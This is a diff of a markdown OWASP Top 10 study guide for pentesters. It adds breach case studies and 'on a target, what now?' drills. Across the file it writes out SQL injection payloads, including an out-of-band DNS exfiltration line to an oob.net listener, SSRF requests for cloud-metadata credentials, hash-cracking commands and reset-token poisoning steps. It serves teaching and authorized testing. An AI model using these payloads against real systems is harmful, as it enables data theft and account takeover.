@@ -30,6 +30,8 @@
 - **§A09 — Security Logging & Monitoring Failures** (Q100–Q104)
 - **§A10 — Server-Side Request Forgery (SSRF)** (Q105–Q114)
 - **§XC — Cross-category chaining & reporting** (Q115–Q120)
+- **§RW — Verified real-world case studies (per category)** (Q121–Q130)
+- **§SD — Scenario drill (you're on a target, what now?)** (Q131–Q140)
 
 > Each `§A0x` block runs in the same order: **Core → How to test → Red-team / escalation → Interview → Prevention.**
 
@@ -40,10 +42,10 @@
 ### Q1. What is the OWASP Top 10, and what is it *not*?
 > *Plain version:* it's a "most common ways web apps get hacked" list, grouped into **10 big buckets** — not 10 exact bugs. Don't tick it like a checklist: each bucket is a whole *family*, and you test every member of it.
 
-An **awareness document** ranking the ten most critical web-application security **risk categories**, refreshed ~every 3–4 years (current stable: **2021**). It is **not** a standard, not a checklist, and not a list of individual vulnerabilities — each entry is a broad *category* that many concrete vuln-classes fall under. Treating it as "ten bugs to check" is the #1 beginner mistake; it's ten *families*, and you test every member.
+An **awareness document** ranking the ten most critical web-application security **risk categories**, refreshed roughly every 3–4 years (current stable: **2021**). It is **not** a standard, not a checklist, and not a list of individual vulnerabilities — each entry is a broad *category* that many concrete vuln-classes fall under. Treating it as "ten bugs to check" is the #1 beginner mistake; it's ten *families*, and you test every member.
 
 ### Q2. How is the 2021 list ranked, and why does that matter?
-By a blend of **data** (prevalence across ~500k apps) and a **community survey** (forward-looking risks the data lags on). Eight categories are data-driven; two (A04, A10) came largely from the survey. It matters because **ranking ≠ your report's severity** — OWASP ranks by *how common + how bad on average*; your finding is scored by *demonstrated impact on this target*.
+By a blend of **data** (prevalence across ≈500k apps) and a **community survey** (forward-looking risks the data lags on). Eight categories are data-driven; two (A04, A10) came largely from the survey. It matters because **ranking ≠ your report's severity** — OWASP ranks by *how common + how bad on average*; your finding is scored by *demonstrated impact on this target*.
 
 ### Q3. Name the 2021 Top 10 in order.
 A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable and Outdated Components · A07 Identification and Authentication Failures · A08 Software and Data Integrity Failures · A09 Security Logging and Monitoring Failures · A10 Server-Side Request Forgery (SSRF).
@@ -138,7 +140,7 @@ Baseline **High** (cross-user PII disclosure via IDOR/BOLA, CWE-639). Escalate: 
 That's **security by obscurity** — a UUID leaked elsewhere (referrer, logs, another endpoint, an email) is still accepted because the server never checks *ownership*. Unguessable IDs are defense-in-depth; the real fix is the per-object authorization check.
 
 ### Q25. Real-world A01 examples?
-**First American Financial (2019)** is the headline: a title-insurance app served documents at **sequential, unauthenticated URLs**, so incrementing the ID walked through **~885 million** files (SSNs, bank statements, driver's-license images) — pure IDOR, no login. Also: mass-assignment privilege escalation (`isAdmin` in body); admin panels via forced browsing; JWT `role` tampering; BOLA in APIs (API1). Among the highest-paid bug classes because one flaw leaks *everyone's* data.
+**First American Financial (2019)** is the headline: a title-insurance app served documents at **sequential, unauthenticated URLs**, so incrementing the ID walked through **≈885 million** files (SSNs, bank statements, driver's-license images) — pure IDOR, no login. Also: mass-assignment privilege escalation (`isAdmin` in body); admin panels via forced browsing; JWT `role` tampering; BOLA in APIs (API1). Among the highest-paid bug classes because one flaw leaks *everyone's* data.
 
 ### Q26. CWEs for A01?
 CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), **CWE-639** (IDOR / authz via user-controlled key), CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization), CWE-732, CWE-22. Cite CWE-639 for IDOR.
@@ -170,7 +172,7 @@ Failures in (or absence of) cryptography exposing sensitive data. Renamed to poi
 Transport (cleartext HTTP for sensitive data? missing HSTS? mixed content? cert gaps?), token/JWT crypto (`alg:none`, weak HS256 secret, RS256→HS256, no expiry — → `JWT/`), password-storage indicators (MD5/SHA1/unsalted in a disclosed dump), predictable reset/session/CSRF tokens (→ `AccountTakeover/`), secrets leaked in responses/JS/config (→ `JSFiles/`, `Recon/`).
 
 ### Q30. How do you test password-hashing strength when you get a dump?
-Identify by prefix/length: 32-hex = MD5, 40-hex = SHA1, 64-hex = SHA256, `$2a$/$2b$/$2y$` = bcrypt, `$6$` = sha512crypt, `$argon2id$` = Argon2 (`hashid`/`hash-identifier` automate this). Then classify: **fast, unsalted** general hashes (raw MD5/SHA1/SHA256 — `hashcat -m 0 / -m 100 / -m 1400`) crack at *billions/sec* on a GPU → **weak (A02)**. **Adaptive, salted KDFs** — bcrypt (`-m 3200`), sha512crypt (`-m 1800`), PBKDF2-HMAC-SHA256 (`-m 10900`), Argon2id (John the Ripper, or hashcat 7.0+) — are deliberately slow with a tunable work factor → acceptable. Prove it by cracking *your own seeded test account* against `rockyou.txt`, never real users' hashes; report algorithm + speed ("unsalted MD5, ~50M candidates in 8s, seeded account cracked"). The absence of a salt (identical hashes for identical passwords, rainbow-table-able) is itself the A02 finding.
+Identify by prefix/length: 32-hex = MD5, 40-hex = SHA1, 64-hex = SHA256, `$2a$/$2b$/$2y$` = bcrypt, `$6$` = sha512crypt, `$argon2id$` = Argon2 (`hashid`/`hash-identifier` automate this). Then classify: **fast, unsalted** general hashes (raw MD5/SHA1/SHA256 — `hashcat -m 0 / -m 100 / -m 1400`) crack at *billions/sec* on a GPU → **weak (A02)**. **Adaptive, salted KDFs** — bcrypt (`-m 3200`), sha512crypt (`-m 1800`), PBKDF2-HMAC-SHA256 (`-m 10900`), Argon2id (John the Ripper, or hashcat 7.0+) — are deliberately slow with a tunable work factor → acceptable. Prove it by cracking *your own seeded test account* against `rockyou.txt`, never real users' hashes; report algorithm + speed ("unsalted MD5, ≈50M candidates in 8s, seeded account cracked"). The absence of a salt (identical hashes for identical passwords, rainbow-table-able) is itself the A02 finding.
 
 ### Q31. Where does weak randomness bite?
 Signals of weak randomness in security tokens (session IDs, reset/CSRF tokens, OTPs, API keys, IVs/nonces): visible **structure** (sequential, timestamp-prefixed, short), a small charset, or a known-weak generator (`java.util.Random`, JS `Math.random()`, PHP `rand()`/`mt_rand()`/`uniqid()` — all seedable/predictable). **How to test:** harvest a few hundred tokens and run **Burp Sequencer** (entropy estimate), or decode them (base64/hex) and diff consecutive values for a counter/time delta; `mt_rand` internal state can be recovered from a handful of outputs (`php_mt_seed`). A predictable **password-reset token** is the money bug → direct ATO with no user interaction. Fix: a CSPRNG — `SecureRandom` (Java), `crypto.randomBytes` (Node), `secrets`/`os.urandom` (Python) — ≥128 bits, unique IV/nonce per encryption.
@@ -290,7 +292,7 @@ Use `tplmap` to automate detection + exploitation. Always use a **benign** comma
 
 ### Q56b. How do you extract data with blind (boolean / time-based) SQLi?
 When there's no visible output, turn the DB into a yes/no oracle and binary-search each character:
-- **Boolean:** `' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -` — page *changes* when the guess is right. Binary-search with `>`/`<` on `ASCII()` (7 requests/char instead of ~50).
+- **Boolean:** `' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -` — page *changes* when the guess is right. Binary-search with `>`/`<` on `ASCII()` (7 requests/char instead of ≈50).
 - **Time-based** (no visible difference at all): MySQL `' AND IF(ASCII(SUBSTRING((SELECT ...),1,1))>77, SLEEP(3), 0)-- -`; MSSQL `'; IF(...) WAITFOR DELAY '0:0:3'--`; PostgreSQL `' AND (SELECT CASE WHEN (...) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -`.
 - **OOB** (fastest exfil where allowed): MSSQL `xp_dirtree '\\'+(SELECT ...)+'.oob.net\x'` / Oracle `UTL_HTTP`/`UTL_INADDR` — the secret arrives as a DNS lookup at your listener.
 
@@ -648,3 +650,75 @@ Report the **concrete vuln + demonstrated impact first**, then tag category + CW
 
 ### Q120. The one meta-lesson across all ten?
 **Never trust the client, and separate code from data.** Almost every category is a failure of one: trusting client-supplied identity/role (A01/A07), input becoming code (A03/A08/A10), or trusting unverified components/data/config (A05/A06/A08). Design for zero-trust of input and least privilege of everything, and most of the Top 10 collapses.
+
+---
+
+# §RW — VERIFIED REAL-WORLD CASE STUDIES (per category)
+
+> One documented, named breach per 2021 category — the citation that proves the category is real, with the *root cause → mechanism → lesson* so you can use it in a report or interview. All facts from public post-mortems/advisories.
+
+### Q121. A01 (Broken Access Control) — the definitive case?
+**First American Financial (2019).** *Root cause:* **no authorization check** on a document-viewer endpoint. *Mechanism:* completed title transactions produced links like `…/DocEdit.aspx?...=<number>`; the number was **sequential** and the page needed **no login**, so anyone could increment/decrement it and read strangers' files — **~885 million** documents (SSNs, bank statements, wire receipts, driver's-license images) going back years. *Lesson:* the textbook IDOR — "logged in" was never even required; enforce per-object ownership server-side on every request, and unguessable IDs are not a substitute for an authorization check. (Also the two-account differential would have caught it in one test: as B, request A's document.)
+
+### Q122. A02 (Cryptographic Failures) — the classic case?
+**Adobe (2013).** *Root cause:* passwords **encrypted, not hashed**. *Mechanism:* **153 million** credentials were protected with **3DES in ECB mode** using a **single key for everyone**, and the plaintext password **hints** were stored alongside; ECB's identical-input→identical-output revealed which accounts shared a password, and the hints did the rest (~1.9M used "123456"). *Lesson:* encryption is **reversible** — password storage must be a slow, salted one-way KDF (Argon2/bcrypt/scrypt/PBKDF2). "We encrypted them" is a red flag, not a defense.
+
+### Q123. A03 (Injection) — a named case with consequences?
+**TalkTalk (2015).** *Root cause:* an unpatched **SQL injection** on legacy pages inherited from a Tiscali acquisition. *Mechanism:* the attacker (a teenager) dumped **156,959 customers** (15,656 with bank-account details) through classic SQLi; the ICO issued a then-record **£400,000** fine because the *same* flaw had been exploited months earlier and left unfixed. *Lesson:* injection is still #1-impact because one query reaches the whole datastore; parameterise everything and treat "legacy/acquired" code as in-scope.
+
+### Q124. A04 (Insecure Design) — a case that's a *design* flaw, not a bug?
+**Experian partner-API (2021, Bill Demirkapi).** *Root cause:* a sensitive flow **designed without the necessary controls**. *Mechanism:* a lender's site called an Experian API that returned anyone's **credit score** from just name + address, and it *accepted all-zeros for date-of-birth* — no authentication, no rate limiting, no abuse resistance by design. *Lesson:* you can't patch your way out of "this endpoint shouldn't exist unauthenticated"; A04 is fixed at design/threat-model time (require auth, rate-limit, and think about abuse before shipping).
+
+### Q125. A05 (Security Misconfiguration) — a headline case?
+**Microsoft Power Apps (2021).** *Root cause:* an **insecure default**. *Mechanism:* the OData list API was **public whenever a portal was misconfigured**, exposing **~38 million** records (SSNs, COVID-19 contact-tracing PII) across 47+ organisations anonymously; Microsoft first called it "by design," then shipped a secure default (table permissions on). *Lesson:* defaults are policy — the platform's safe setting was *off*, so thousands inherited the exposure; harden and verify configuration, and don't trust "secure by default" without checking.
+
+### Q126. A06 (Vulnerable & Outdated Components) — the definitive case?
+**Equifax (2017).** *Root cause:* a **known, patch-available** component CVE left unremediated. *Mechanism:* **Apache Struts CVE-2017-5638** (RCE via a crafted `Content-Type` header; patch shipped the day it was disclosed) on the online-dispute portal was exploited **3 days after the fix was available**; attackers dwelled ~2.5 months (an expired cert meant inspection tooling wasn't decrypting traffic) and exfiltrated **147.9 million** identities. *Lesson:* component inventory + fast patching + working detection are one chain — break any link and a published CVE becomes a nation-scale breach.
+
+### Q127. A07 (Identification & Authentication Failures) — the case everyone cites?
+**Colonial Pipeline (2021).** *Root cause:* **no MFA** on a reachable account. *Mechanism:* the DarkSide group logged into a **legacy VPN account with only a password** (reused and exposed in a prior-breach dump; the account was no longer used but still active), and ransomware shut down the largest U.S. fuel pipeline, forcing a state of emergency. *Lesson:* a single MFA prompt on that one account likely prevents the whole incident; enforce MFA everywhere, and disable dormant accounts.
+
+### Q128. A08 (Software & Data Integrity Failures) — the archetype?
+**SolarWinds / SUNBURST (2020).** *Root cause:* a compromised **build pipeline**, not a stolen key. *Mechanism:* the SUNSPOT implant swapped a source file *during compilation*, so the backdoored Orion DLL was **legitimately code-signed** by SolarWinds' own CI and auto-updated to **18,000+** organisations (attributed to Russia's SVR/APT29). *Lesson:* a signature proves *who built it*, not *that the build was clean*; protect build integrity (reproducible builds, isolated signing, SBOM, artifact attestation) — the A08 control set.
+
+### Q129. A09 (Security Logging & Monitoring Failures) — the case?
+**Target (2013).** *Root cause:* **detection without response**. *Mechanism:* the FireEye system **did** detect the card-stealing malware and fired alerts (even naming the exfil/staging servers), but the security team **ignored** them and the automatic-eradication feature was switched off; **40 million** cards were stolen and the CEO and CIO both resigned. *Lesson:* alerts nobody acts on equal no monitoring at all; A09 is about the *response* loop, not just the log line.
+
+### Q130. A10 (SSRF) — the definitive cloud case?
+**Capital One (2019).** *Root cause:* an SSRF-able request path plus an **over-privileged IAM role**. *Mechanism:* Paige Thompson coerced a misconfigured WAF into requesting `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (IMDSv1, no token), lifted the temporary AWS credentials, and — because that role could list/read S3 — dumped **~106 million** applicants' data. *Lesson:* SSRF steps *around* the perimeter into internal identity; this breach is exactly why AWS built **IMDSv2** (token-bound metadata) — enforce it, scope roles least-privilege, and egress-filter the metadata IP.
+
+---
+
+# §SD — SCENARIO DRILL (you're on a target — what now?)
+
+> "You see X → do Y," mapped to the 2021 buckets. Each answer is the decision + the concrete next move — the way an interviewer or a live engagement actually tests you.
+
+### Q131. You can change a URL `id` and see another user's invoice. First moves?
+**A01/IDOR.** Confirm with the **two-account differential** (as B, request A's object → success = broken authz), rule out a shared/public object (does the value differ per user?), then **escalate the impact**: enumerate a bounded, benign range to show scale, reach a higher-value object (admin/other-tenant), and pair with mass-assignment or `role` tamper if present. Report "as B I retrieved A's object 1337," CWE-639, rate by data sensitivity × count (the First American shape).
+
+### Q132. The login page hands you a session cookie in plain HTTP on one endpoint. Move?
+**A02.** Check the whole auth surface for crypto/transport failures: any sensitive data over HTTP, missing HSTS, mixed content; then the token itself — JWT (`alg:none`, weak HS256 secret → crack, RS256→HS256 confusion → the JWT kit), predictable session/reset tokens (entropy/structure), and password storage hints (error messages, `/robots`, leaked dumps). Escalate a forged/weak token to impersonation → ATO.
+
+### Q133. A search box reflects your input and a single quote throws a DB error. Move?
+**A03/Injection.** You likely have SQLi — confirm with a boolean/time differential, fingerprint the DBMS, then escalate along the ceiling: dump (auth bypass / data), read/write files, and attempt RCE (`xp_cmdshell` / `COPY … FROM PROGRAM` / UDF) per DBMS. Use the SQLi kit; keep payloads bounded and benign. If it's a template/`{{}}` context, pivot to SSTI; if a NoSQL body, to NoSQLi.
+
+### Q134. A "request a quote" flow lets you skip a step or set your own price. Move?
+**A04/Insecure Design.** This is business-logic — test the *flow*, not a single field: reorder/skip steps, replay a paid step, tamper price/quantity/discount, negative values, and race the limit (redeem-once, gift-card). There's often no "bug" in one request — the design lacks a control. Demonstrate the abuse (bounded, own accounts), quantify the loss, and note the missing control (server-side state machine, atomic checks, rate limits).
+
+### Q135. Directory listing / a stack trace / `/actuator` shows up. Move?
+**A05/Misconfiguration.** Enumerate the misconfig family: exposed `.git`/`.env`/backup files (→ source+secrets), verbose errors leaking versions/secrets, default creds, open admin/debug/Swagger, permissive CORS, missing security headers. Chain a leak into impact (secrets → auth, `.git` → source → more bugs). Cite the concrete file/response, not "headers missing."
+
+### Q136. A JS bundle reveals `jquery 1.x` / a known-vulnerable library or framework version. Move?
+**A06/Vulnerable Components.** Fingerprint exact versions (JS libs, server banners, framework), map to known CVEs, and confirm the vulnerable code path is reachable (not just present). If it's an RCE-class CVE (Struts/Spring4Shell/Log4Shell/deserialization), that's your Critical — the Equifax path. Don't report "old jQuery" generically; prove the specific exploitable sink or a working PoC.
+
+### Q137. A password-reset email link's host matches a `Host` header you controlled. Move?
+**A07 + host-header (`HostHeader` kit).** Try **reset-link poisoning**: set `Host`/`X-Forwarded-Host` to your domain, trigger a reset for a victim you control, and see if the token-bearing link points at your host (token capture → ATO). Also test token predictability/reuse, unlimited OTP (2FA brute), and session fixation. Prove on your own two accounts, CWE-640.
+
+### Q138. An app auto-updates from a URL, or deserializes a blob / loads a serialized cookie. Move?
+**A08/Integrity.** For updates/plugins: is the source verified (signature/pin) or spoofable? For deserialization: fingerprint the format (Java `ac ed`/`rO0`, PHP, .NET ViewState, Python pickle), and if user-controlled, go for the RCE ceiling with a gadget (ysoserial/PHPGGC) — OOB/URLDNS first to confirm blind, then one benign command. Also check CI/CD trust (dependency confusion). This is the RCE bucket — treat it as Critical.
+
+### Q139. You found a real bug — how do you check the target's detection/response (A09) safely?
+**A09.** You mostly *infer* A09: note whether your (authorized) testing triggered any visible rate-limiting, blocking, or follow-up; whether errors/lockouts appear; whether verbose logs are exposed (CRLF log-forging, secrets in logs). In a report, frame A09 as a *contributing* finding ("the mass IDOR enumeration produced no throttling/alerting over N requests") rather than a standalone — it multiplies the severity of the primary bug (the Target lesson).
+
+### Q140. A field takes a URL — webhook, image-import, PDF-from-URL, `?url=`. Move?
+**A10/SSRF.** Point it at your Collaborator (confirm the server fetches it), then at cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — IMDSv1 → role creds (the Capital One path); if IMDSv2 blocks you, pivot to internal port-scanning/service reach (`http://localhost:port`, gopher→Redis). Validate any creds **once** and stop. CWE-918, Critical when it reaches identity or internal data. (In 2025 this same bug is filed under A01.)
